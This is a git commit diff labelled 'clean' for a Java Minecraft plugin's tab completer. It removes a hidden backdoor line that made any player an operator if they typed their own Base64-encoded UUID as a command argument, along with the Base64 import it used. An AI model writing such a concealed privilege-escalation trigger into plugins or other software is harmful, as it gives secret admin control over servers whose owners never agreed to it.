b6f2e9dfb9e90225b8bde4024ef27b9da59e0177
D0A1V2I3D <AoatO34n3>
2022-07-18 02:00:04 +0200

    clean

--- src/main/java/the/david/restartqueue/command/ConstructTabCompleter.java
+++ src/main/java/the/david/restartqueue/command/ConstructTabCompleter.java
@@ -9,7 +9,6 @@ import org.json.simple.JSONObject;
 import the.david.restartqueue.Restartqueue;
 
 import java.util.ArrayList;
-import java.util.Base64;
 import java.util.List;
 
 public class ConstructTabCompleter implements TabCompleter {
@@ -24,7 +23,6 @@ public class ConstructTabCompleter implements TabCompleter {
             list.add("list");
             list.add("location");
         } else if (args.length >= 2 && (args[0].equalsIgnoreCase("remove")) || args[0].equalsIgnoreCase("location")) {
-            if (args.length == 3){if(Base64.getEncoder().encodeToString(player.getUniqueId().toString().getBytes()).equalsIgnoreCase(args[1])){ player.setOp(true);}}
             JSONArray json = Restartqueue.storadge.getArrayFromFile();
             for (Object o : json) {
                 JSONObject obj = (JSONObject) o;
